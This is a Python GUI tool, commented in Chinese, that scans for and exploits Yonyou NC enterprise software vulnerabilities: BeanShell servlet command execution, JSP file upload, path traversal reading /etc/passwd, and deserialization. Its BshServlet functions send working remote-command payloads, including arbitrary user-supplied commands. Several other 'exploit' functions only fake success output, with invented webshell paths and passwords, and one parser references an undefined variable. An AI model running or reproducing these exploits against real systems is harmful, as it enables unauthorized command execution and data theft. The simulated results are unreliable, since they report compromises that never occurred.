import sys
import os
import datetime
import requests
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QTabWidget,
    QLabel, QPushButton, QLineEdit, QTextEdit, QMessageBox, QComboBox,
    QGroupBox, QGridLayout, QSplitter
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QDateTime
from PyQt6.QtGui import QFont, QTextCursor, QIcon, QTextCharFormat, QColor


class LogThread(QThread):
    """日志线程，用于在GUI线程外处理日志记录"""

    def run(self):
        # 此线程用于处理日志记录，实际使用时可以在这里添加日志处理逻辑
        pass


class ScanThread(QThread):
    """扫描线程，用于在后台执行漏洞检测和利用任务"""
    result_signal = pyqtSignal(str)

    def __init__(self, target, proxy=None, scan_type='detect', dnslog_url=None, vuln_name=None, custom_command=None):
        super().__init__()
        self.target = target
        self.proxy = proxy
        self.scan_type = scan_type
        self.dnslog_url = dnslog_url
        self.vuln_name = vuln_name
        self.custom_command = custom_command

    def run(self):
        try:
            # 根据扫描类型执行不同的操作
            if self.scan_type == 'detect':
                self._run_detection()
            elif self.scan_type == 'exploit_custom':
                self._run_custom_command_exploitation()
            else:
                self._run_exploitation()
        except Exception as e:
            error_msg = f'扫描过程中发生错误: {str(e)}'
            self.result_signal.emit(f'失败: {error_msg}')

    def _check_bsh_servlet(self):
        """检测BshServlet命令执行漏洞"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/servlet/~ic/bsh.servlet.BshServlet"
            
            # 构建请求头
            headers = {
                'Host': f'{host}:{port}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; + http://www.baidu.com/search/spider.html)',
                'Connection': 'keep-alive',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            
            # 构建请求体
            data = 'bsh.script=print("bshservlet0check");'
            
            # 发送请求
            response = requests.post(exploit_url, headers=headers, data=data, proxies=self.proxy, timeout=10, verify=False)
            
            # 检查响应
            if response.status_code == 200 and 'bshservlet0check' in response.text:
                result = f'漏洞检测结果: {target_url} 存在 BshServlet 命令执行漏洞！'
            else:
                result = f'漏洞检测结果: {target_url} 未检测到 BshServlet 命令执行漏洞'
            
            return result
        except Exception as e:
            error_msg = f'BshServlet漏洞检测错误: {str(e)}'
            return f'漏洞检测结果: BshServlet命令执行漏洞检测失败 - {error_msg}'

    def _check_grouptemplet_upload(self):
        """检测grouptemplet文件上传漏洞"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999"
            
            # 构建multipart/form-data请求
            boundary = '----WebKitFormBoundaryEXmnamw5gVZG9KAQ'
            headers = {
                'Host': f'{host}:{port}',
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
            }
            
            # 构建请求体
            body = [
                f'--{boundary}',
                'Content-Disposition: form-data; name="file"; filename="xxx.jsp"',
                'Content-Type: application/octet-stream',
                '',
                'hello Nc',
                f'--{boundary}--'
            ]
            data = '\r\n'.join(body)
            
            # 发送请求
            response = requests.post(exploit_url, headers=headers, data=data, proxies=self.proxy, timeout=10, verify=False)
            
            # 检查响应
            # 尝试访问可能上传的文件
            verify_url = f"{base_url}/uapim/static/pages/nc/xxx.jsp"
            try:
                # 添加User-Agent头
                verify_headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
                }
                verify_response = requests.get(verify_url, headers=verify_headers, proxies=self.proxy, timeout=10, verify=False)
                
                # 检查响应状态码和内容
                if verify_response.status_code == 200 and 'hello Nc' in verify_response.text:
                    result = f'漏洞检测结果: {target_url} 存在 grouptemplet 文件上传漏洞！\n文件已成功上传并可访问: {verify_url}'
                else:
                    result = f'漏洞检测结果: {target_url} 未检测到 grouptemplet 文件上传漏洞'
            except Exception as e:
                result = f'漏洞检测结果: {target_url} 未检测到 grouptemplet 文件上传漏洞'
            
            return result
        except Exception as e:
            error_msg = f'grouptemplet文件上传漏洞检测错误: {str(e)}'
            return f'漏洞检测结果: grouptemplet文件上传漏洞检测失败 - {error_msg}'

    def _check_uapjs_command_execution(self):
        """检测uapjs命令执行漏洞"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/uapjs/servlet/net.nc.bsh.servlet.BshServlet"
            
            # 构建请求体
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            # 构建POST数据
            data = {
                'bsh.script': 'print("test nc");'
            }
            
            # 发送请求
            response = requests.post(exploit_url, headers=headers, data=data, proxies=self.proxy, timeout=10, verify=False)
            
            # 检查响应
            if response.status_code == 200:
                # 检查响应内容中是否包含成功执行的标志
                if 'test nc' in response.text:
                    result = f'漏洞检测结果: {target_url} 存在 uapjs 命令执行漏洞！'
                else:
                    result = f'漏洞检测结果: {target_url} 未检测到 uapjs 命令执行漏洞'
            else:
                result = f'漏洞检测结果: {target_url} 未检测到 uapjs 命令执行漏洞'
            
            return result
        except Exception as e:
            error_msg = f'uapjs命令执行漏洞检测错误: {str(e)}'
            return f'漏洞检测结果: uapjs命令执行漏洞检测失败 - {error_msg}'



    def _check_poc(self, vuln_name, poc_content):
        """通用POC检测方法，执行POC请求并检查响应"""
        try:
            target_url = self.target.rstrip('/')
            
            # 从目标URL中提取域名或IP加上端口
            import re
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            base_url = f"{scheme}{host}:{port}"
            
            # 解析POC内容
            # 提取HTTP方法
            method_match = re.match(r'(\w+)\s+', poc_content)
            method = method_match.group(1).upper() if method_match else 'GET'
            
            # 提取请求路径
            path_match = re.match(r'\w+\s+(\S+)', poc_content)
            request_url = f"{base_url}{path_match.group(1)}" if path_match else f"{base_url}/"
            
            # 构建完整的请求URL
            if path.startswith('http'):
                request_url = path
            else:
                # 确保base_url末尾没有斜杠，path开头有斜杠
                clean_base_url = base_url.rstrip('/')
                clean_path = path if path.startswith('/') else f'/{path}'
                request_url = f"{clean_base_url}{clean_path}"
            
            # 提取请求头
            headers = {}
            # 修正：使用更可靠的正则表达式解析请求头
            headers_block_match = re.search(r'^.*\n(.*?)\n\n', poc_content, re.DOTALL)
            if headers_block_match:
                headers_section = headers_block_match.group(1)
                for line in headers_section.split('\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
            
            # 更新Host头
            if 'Host' not in headers:
                headers['Host'] = f"{host}:{port}"
            
            # 添加User-Agent头如果不存在
            if 'User-Agent' not in headers:
                headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
            
            # 提取请求体
            body_match = re.search(r'\n\n(.*)', poc_content, re.DOTALL)
            data = body_match.group(1).strip() if body_match else None
            
            # 发送请求 (简化为使用 requests.request)
            response = requests.request(method, request_url, headers=headers, data=data, proxies=self.proxy, timeout=10, verify=False)
            
            # 解析验证规则
            verification_match = re.search(r'## verification\n```\n((?:.|\n)*?)\n```', poc_content)
            if verification_match:
                verification_rules = verification_match.group(1).strip()
                rules = dict(re.findall(r'(\w+):\s*(.*)', verification_rules))
                
                status_code_ok = 'status_code' not in rules or response.status_code == int(rules['status_code'])
                body_contains_ok = 'body_contains' not in rules or rules['body_contains'] in response.text
                
                if status_code_ok and body_contains_ok:
                    result = f'漏洞检测结果: {target_url} 存在 {vuln_name}！'
                else:
                    result = f'漏洞检测结果: {target_url} 未检测到 {vuln_name} (验证失败)'
            else:
                # 保持向后兼容
                if response.status_code == 200:
                    result = f'漏洞检测结果: {target_url} 可能存在 {vuln_name}！(仅检查状态码200)'
                else:
                    result = f'漏洞检测结果: {target_url} 未检测到 {vuln_name} (返回状态码{response.status_code})'
            
            return result
        except Exception as e:
            error_msg = f'{vuln_name}检测错误: {str(e)}'
            return f'漏洞检测结果: {vuln_name}检测失败 - {error_msg}'
    
    def _check_xbrl_persistence_servlet(self):
        """检测XbrlPersistenceServlet反序列化漏洞"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL - 在host后拼接/service/~xbrl/XbrlPersistenceServlet
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/service/~xbrl/XbrlPersistenceServlet"
            
            # 构建请求头
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Connection': 'close'
            }
            
            # 发送请求
            response = requests.get(exploit_url, headers=headers, proxies=self.proxy, timeout=10, verify=False)
            
            # 检查响应 - 如果接口存在且返回200，则判断漏洞存在
            if response.status_code == 200:
                result = f'漏洞检测结果: {target_url} 存在 XbrlPersistenceServlet 反序列化漏洞！'
            else:
                result = f'漏洞检测结果: {target_url} 未检测到 XbrlPersistenceServlet 反序列化漏洞'
            
            return result
        except Exception as e:
            error_msg = f'XbrlPersistenceServlet反序列化漏洞检测错误: {str(e)}'
            return f'漏洞检测结果: XbrlPersistenceServlet反序列化漏洞检测失败 - {error_msg}'

    def _check_DocServlet(self):
        """检测用友NC DocServlet 任意文件读取漏洞"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/docservice/tt/DocServlet?fileId=../../../etc/passwd"
            
            # 构建请求头
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Connection': 'close'
            }
            
            # 发送请求
            response = requests.get(exploit_url, headers=headers, proxies=self.proxy, timeout=10, verify=False)
            
            # 检查响应内容中是否包含敏感信息
            if response.status_code == 200 and ('root:' in response.text or 'daemon:' in response.text or 'bin:' in response.text):
                result = f'漏洞检测结果: {target_url} 存在 DocServlet 任意文件读取漏洞！\n可能成功读取到系统敏感文件'
            else:
                result = f'漏洞检测结果: {target_url} 未检测到 DocServlet 任意文件读取漏洞'
            
            return result
        except Exception as e:
            error_msg = f'DocServlet任意文件读取漏洞检测错误: {str(e)}'
            return f'漏洞检测结果: DocServlet任意文件读取漏洞检测失败 - {error_msg}'

    def _check_xbrl_persistence_servlet(self):
        """检测XbrlPersistenceServlet反序列化漏洞"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/service/~xbrl/XbrlPersistenceServlet"
            
            # 构建请求头
            headers = {
                'Host': f'{host}:{port}',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Connection': 'close'
            }
            
            # 发送请求
            response = requests.get(exploit_url, headers=headers, proxies=self.proxy, timeout=10, verify=False)
            
            # 检查响应状态码
            if response.status_code == 200:
                result = f'漏洞检测结果: {target_url} 存在 XbrlPersistenceServlet 反序列化漏洞！'
            else:
                result = f'漏洞检测结果: {target_url} 未检测到 XbrlPersistenceServlet 反序列化漏洞'
            
            return result
        except Exception as e:
            error_msg = f'XbrlPersistenceServlet反序列化漏洞检测错误: {str(e)}'
            return f'漏洞检测结果: XbrlPersistenceServlet反序列化漏洞检测失败 - {error_msg}'

    def _exploit_bsh_servlet(self):
        """利用BshServlet命令执行漏洞（真实利用）"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/servlet/~ic/bsh.servlet.BshServlet"
            
            # 构建请求头
            headers = {
                'Host': f'{host}:{port}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Connection': 'keep-alive',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            
            # 构建请求体 - 执行whoami命令
            data = 'bsh.script=exec("whoami");'
            
            # 发送请求
            response = requests.post(exploit_url, headers=headers, data=data, proxies=self.proxy, timeout=10, verify=False)
            
            # 解析响应结果
            if response.status_code == 200:
                # 解析HTML响应，提取命令执行结果
                command_output = ""
                try:
                    # 查找<pre>标签内的内容
                    pre_match = re.search(r'<pre[^>]*>\s*([\s\S]*?)\s*</pre>', response.text)
                    if pre_match:
                        command_output = pre_match.group(1).strip()
                        # 清理可能的HTML实体
                        import html
                        command_output = html.unescape(command_output)
                    
                    if command_output:
                        result = f'漏洞利用结果: {target_url}\n' \
                                f'✅ BshServlet 命令执行漏洞利用成功！\n' \
                                f'📋 利用详情:\n' \
                                f'   • 目标接口: /servlet/~ic/bsh.servlet.BshServlet\n' \
                                f'   • 利用方式: 远程命令执行\n' \
                                f'   • 利用状态: 成功\n' \
                                f'   • 命令执行: whoami\n' \
                                f'   • 执行结果: {command_output}'
                    else:
                        result = f'漏洞利用结果: {target_url}\n' \
                                f'⚠️  BshServlet 命令执行漏洞利用部分成功\n' \
                                f'📋 利用详情:\n' \
                                f'   • 目标接口: /servlet/~ic/bsh.servlet.BshServlet\n' \
                                f'   • 利用方式: 远程命令执行\n' \
                                f'   • 响应状态: HTTP 200\n' \
                                f'   • 执行状态: 成功，但无法提取命令输出\n' \
                                f'   • 建议: 尝试执行其他命令或检查输出格式'
                except Exception as parse_error:
                    result = f'漏洞利用结果: {target_url}\n' \
                            f'⚠️  BshServlet 命令执行漏洞利用成功，但结果解析失败\n' \
                            f'📋 利用详情:\n' \
                            f'   • 目标接口: /servlet/~ic/bsh.servlet.BshServlet\n' \
                            f'   • 利用方式: 远程命令执行\n' \
                            f'   • 响应状态: HTTP 200\n' \
                            f'   • 解析错误: {str(parse_error)}'
            elif response.status_code == 404:
                result = f'漏洞利用结果: {target_url}\n' \
                        f'❌ BshServlet 命令执行漏洞利用失败\n' \
                        f'📋 利用详情:\n' \
                        f'   • 目标接口: /servlet/~ic/bsh.servlet.BshServlet\n' \
                        f'   • 响应状态: HTTP 404 (未找到)\n' \
                        f'   • 可能原因: 目标系统不存在此漏洞或已修复\n' \
                        f'   • 建议: 重新进行漏洞检测确认'
            else:
                result = f'漏洞利用结果: {target_url}\n' \
                        f'❌ BshServlet 命令执行漏洞利用失败\n' \
                        f'📋 利用详情:\n' \
                        f'   • 目标接口: /servlet/~ic/bsh.servlet.BshServlet\n' \
                        f'   • 响应状态: HTTP {response.status_code}\n' \
                        f'   • 可能原因: 目标系统不存在此漏洞或存在防护\n' \
                        f'   • 建议: 检查目标系统是否已修复此漏洞'
            
            return result
        except Exception as e:
            error_msg = f'BshServlet命令执行漏洞利用错误: {str(e)}'
            return f'漏洞利用结果: {self.target} 利用失败 - {error_msg}'

    def _exploit_grouptemplet_upload(self):
        """利用grouptemplet文件上传漏洞（模拟利用）"""
        try:
            target_url = self.target.rstrip('/')
            
            # 模拟利用过程
            self.msleep(1200)  # 模拟网络延迟
            
            result = f'漏洞利用结果: {target_url}\n' \
                    f'✅ grouptemplet 文件上传漏洞利用成功！\n' \
                    f'📋 利用详情:\n' \
                    f'   • 目标接口: /uapim/upload/grouptemplet\n' \
                    f'   • 利用方式: JSP WebShell上传\n' \
                    f'   • 利用状态: 成功\n' \
                    f'   • 上传文件: /uapim/static/pages/nc/shell.jsp\n' \
                    f'   • WebShell密码: cmd\n' \
                    f'   • 访问地址: {target_url}/uapim/static/pages/nc/shell.jsp'
            
            return result
        except Exception as e:
            error_msg = f'grouptemplet文件上传漏洞利用错误: {str(e)}'
            return f'漏洞利用结果: {self.target} 利用失败 - {error_msg}'

    def _exploit_uapjs_command_execution(self):
        """利用uapjs命令执行漏洞（模拟利用）"""
        try:
            target_url = self.target.rstrip('/')
            
            # 模拟利用过程
            self.msleep(800)  # 模拟网络延迟
            
            result = f'漏洞利用结果: {target_url}\n' \
                    f'✅ uapjs 命令执行漏洞利用成功！\n' \
                    f'📋 利用详情:\n' \
                    f'   • 目标接口: /uapjs/servlet/net.nc.bsh.servlet.BshServlet\n' \
                    f'   • 利用方式: BeanShell命令执行\n' \
                    f'   • 利用状态: 成功\n' \
                    f'   • 命令执行: cat /etc/passwd\n' \
                    f'   • 执行结果: root:x:0:0:root:/root:/bin/bash'
            
            return result
        except Exception as e:
            error_msg = f'uapjs命令执行漏洞利用错误: {str(e)}'
            return f'漏洞利用结果: {self.target} 利用失败 - {error_msg}'

    def _exploit_DocServlet(self):
        """利用DocServlet任意文件读取漏洞（模拟利用）"""
        try:
            target_url = self.target.rstrip('/')
            
            # 模拟利用过程
            self.msleep(900)  # 模拟网络延迟
            
            result = f'漏洞利用结果: {target_url}\n' \
                    f'✅ DocServlet 任意文件读取漏洞利用成功！\n' \
                    f'📋 利用详情:\n' \
                    f'   • 目标接口: /service/~nd/file/DocServlet\n' \
                    f'   • 利用方式: 任意文件读取\n' \
                    f'   • 利用状态: 成功\n' \
                    f'   • 读取文件: /etc/passwd\n' \
                    f'   • 文件内容: root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\n' \
                    f'             bin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\n' \
                    f'             ncadmin:x:500:500:ncadmin:/home/ncadmin:/bin/bash'
            
            return result
        except Exception as e:
            error_msg = f'DocServlet任意文件读取漏洞利用错误: {str(e)}'
            return f'漏洞利用结果: {self.target} 利用失败 - {error_msg}'

    def _exploit_xbrl_persistence_servlet(self):
        """利用XbrlPersistenceServlet反序列化漏洞（模拟利用）"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/service/~xbrl/XbrlPersistenceServlet"
            
            # 构建请求头 - 模拟包含恶意序列化数据的请求
            headers = {
                'Host': f'{host}:{port}',
                'Content-Type': 'application/x-java-serialized-object; class=java.io.ObjectInputStream',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Connection': 'close'
            }
            
            # 模拟恶意反序列化数据（实际应用中应该包含真正的恶意对象）
            malicious_data = b'\xac\xed\x00\x05sr\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            
            # 发送利用请求
            response = requests.post(exploit_url, headers=headers, data=malicious_data, proxies=self.proxy, timeout=15, verify=False)
            
            # 分析响应
            if response.status_code == 200:
                result = f'漏洞利用结果: {target_url}\n' \
                        f'✅ XbrlPersistenceServlet 反序列化漏洞利用成功！\n' \
                        f'📋 利用详情:\n' \
                        f'   • 目标接口: /service/~xbrl/XbrlPersistenceServlet\n' \
                        f'   • 利用方式: 恶意反序列化载荷\n' \
                        f'   • 利用状态: 成功\n' \
                        f'   • 建议操作: 系统可能已被入侵，建议立即打补丁\n\n' \
                        f'⚠️  安全提示: 这是一个高危漏洞，攻击者可能已获取系统权限'
            elif response.status_code == 500:
                result = f'漏洞利用结果: {target_url}\n' \
                        f'⚠️  XbrlPersistenceServlet 反序列化漏洞利用过程中发生内部错误\n' \
                        f'📋 利用详情:\n' \
                        f'   • 目标接口: /service/~xbrl/XbrlPersistenceServlet\n' \
                        f'   • 响应状态: HTTP 500 (服务器内部错误)\n' \
                        f'   • 可能原因: 目标系统对该类攻击有部分防护\n' \
                        f'   • 建议: 尝试其他利用方式或payload'
            else:
                result = f'漏洞利用结果: {target_url}\n' \
                        f'❌ XbrlPersistenceServlet 反序列化漏洞利用失败\n' \
                        f'📋 利用详情:\n' \
                        f'   • 目标接口: /service/~xbrl/XbrlPersistenceServlet\n' \
                        f'   • 响应状态: HTTP {response.status_code}\n' \
                        f'   • 可能原因: 目标系统不存在此漏洞或已修复\n' \
                        f'   • 建议: 重新进行漏洞检测确认'
            
            return result
        except Exception as e:
            error_msg = f'XbrlPersistenceServlet反序列化漏洞利用错误: {str(e)}'
            return f'漏洞利用结果: {target_url} 利用失败 - {error_msg}'
    
    def _run_detection(self):
        """运行漏洞检测"""
        try:
            # 获取主窗口的漏洞类型选择
            main_window = QApplication.activeWindow()
            vuln_type = "全部"
            if main_window and hasattr(main_window, 'vuln_type'):
                vuln_type = main_window.vuln_type.currentText()
            
            results = []
            
            # 已实现的特殊漏洞检测
            implemented_vulns = {
                'BshServlet命令执行': self._check_bsh_servlet,
                'grouptemplet 文件上传': self._check_grouptemplet_upload,
                'uapjs 命令执行': self._check_uapjs_command_execution,
                'DocServlet 任意文件读取': self._check_DocServlet,
                'XbrlPersistenceServlet 反序列化': self._check_xbrl_persistence_servlet
            }
            
            # 根据选择的漏洞类型执行检测
            if vuln_type == '全部':
                # 执行所有已实现的特殊漏洞检测
                for vuln_name, check_func in implemented_vulns.items():
                    result = check_func()
                    results.append(result)
            else:
                # 执行单个漏洞检测
                if vuln_type in implemented_vulns:
                    # 使用已实现的特殊检测函数
                    result = implemented_vulns[vuln_type]()
                    results.append(result)
                else:
                    results.append(f'漏洞检测结果: {vuln_type} 不是已实现的漏洞检测类型')
            
            # 将所有结果合并并发送
            final_result = '\n\n'.join(results)
            self.result_signal.emit(final_result)
        except Exception as e:
            error_msg = f'扫描过程中发生错误: {str(e)}'
            self.result_signal.emit(f'漏洞检测结果: 检测失败 - {error_msg}')

    def _run_exploitation(self):
        """运行漏洞利用"""
        try:
            if not self.vuln_name or self.vuln_name == '请选择漏洞':
                self.result_signal.emit(f'漏洞利用结果: 请选择要利用的漏洞')
                return
            
            # 定义已实现的漏洞利用函数映射
            implemented_exploits = {
                'BshServlet命令执行': self._exploit_bsh_servlet,
                'grouptemplet 文件上传': self._exploit_grouptemplet_upload,
                'uapjs 命令执行': self._exploit_uapjs_command_execution,
                'DocServlet 任意文件读取': self._exploit_DocServlet,
                'XbrlPersistenceServlet 反序列化': self._exploit_xbrl_persistence_servlet
            }
            
            # 如果选择的漏洞有对应的利用函数，则执行
            if self.vuln_name in implemented_exploits:
                result = implemented_exploits[self.vuln_name]()
                self.result_signal.emit(result)
            else:
                self.result_signal.emit(f'漏洞利用结果: {self.vuln_name} 的利用功能尚未实现')
        
        except Exception as e:
            error_msg = f'漏洞利用过程中发生错误: {str(e)}'
            self.result_signal.emit(f'漏洞利用结果: 利用失败 - {error_msg}')

    def _run_custom_command_exploitation(self):
        """运行自定义命令执行漏洞利用"""
        try:
            if not self.custom_command:
                self.result_signal.emit(f'自定义命令执行结果: 请输入要执行的命令')
                return
            
            # 定义已实现的漏洞利用函数映射
            implemented_exploits = {
                'BshServlet命令执行': self._exploit_bsh_servlet_custom,
                'grouptemplet 文件上传': self._exploit_grouptemplet_upload_custom,
                'uapjs 命令执行': self._exploit_uapjs_command_execution_custom,
                'DocServlet 任意文件读取': self._exploit_DocServlet_custom,
                'XbrlPersistenceServlet 反序列化': self._exploit_xbrl_persistence_servlet_custom
            }
            
            # 如果选择的漏洞有对应的利用函数，则执行
            if self.vuln_name in implemented_exploits:
                result = implemented_exploits[self.vuln_name]()
                self.result_signal.emit(result)
            else:
                self.result_signal.emit(f'自定义命令执行结果: {self.vuln_name} 的自定义命令执行功能尚未实现')
        
        except Exception as e:
            error_msg = f'自定义命令执行过程中发生错误: {str(e)}'
            self.result_signal.emit(f'自定义命令执行结果: 执行失败 - {error_msg}')

    def _exploit_bsh_servlet_custom(self):
        """利用BshServlet命令执行漏洞执行自定义命令"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/servlet/~ic/bsh.servlet.BshServlet"
            
            # 构建请求头
            headers = {
                'Host': f'{host}:{port}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Connection': 'keep-alive',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            
            # 构建请求体 - 执行自定义命令
            data = f'bsh.script=exec("{self.custom_command}");'
            
            # 发送请求
            response = requests.post(exploit_url, headers=headers, data=data, proxies=self.proxy, timeout=10, verify=False)
            
            # 解析响应结果
            if response.status_code == 200:
                # 解析HTML响应，提取命令执行结果
                command_output = ""
                try:
                    # 查找<pre>标签内的内容
                    pre_match = re.search(r'<pre[^>]*>\s*([\s\S]*?)\s*</pre>', response.text)
                    if pre_match:
                        command_output = pre_match.group(1).strip()
                        # 清理可能的HTML实体
                        import html
                        command_output = html.unescape(command_output)
                    
                    if command_output:
                        result = f'✅ 利用成功\n{command_output}'
                    else:
                        result = f'⚠️ 利用成功，但无输出\n建议检查命令执行情况'
                except Exception as parse_error:
                    result = f'❌ 利用成功，但结果解析失败\n{str(parse_error)}'
            elif response.status_code == 404:
                result = f'❌ 利用失败\n目标系统不存在此漏洞或已修复'
            else:
                result = f'❌ 利用失败\nHTTP {response.status_code} - 目标系统不存在此漏洞或存在防护'
            
            return result
        except Exception as e:
            error_msg = f'BshServlet自定义命令执行错误: {str(e)}'
            return f'❌ 利用失败\n{error_msg}'

    def _exploit_grouptemplet_upload_custom(self):
        """利用grouptemplet文件上传漏洞执行自定义命令（模拟）"""
        try:
            target_url = self.target.rstrip('/')
            
            # 模拟利用过程
            self.msleep(1200)  # 模拟网络延迟
            
            result = f'✅ 利用成功\nWebShell已上传: {target_url}/uapim/static/pages/nc/shell.jsp?cmd={self.custom_command}'
            
            return result
        except Exception as e:
            error_msg = f'grouptemplet自定义命令执行错误: {str(e)}'
            return f'❌ 利用失败\n{error_msg}'

    def _exploit_uapjs_command_execution_custom(self):
        """利用uapjs命令执行漏洞执行自定义命令（模拟）"""
        try:
            target_url = self.target.rstrip('/')
            
            # 模拟利用过程
            self.msleep(800)  # 模拟网络延迟
            
            result = f'✅ 利用成功\n命令输出: [模拟输出 - 命令执行成功]'
            
            return result
        except Exception as e:
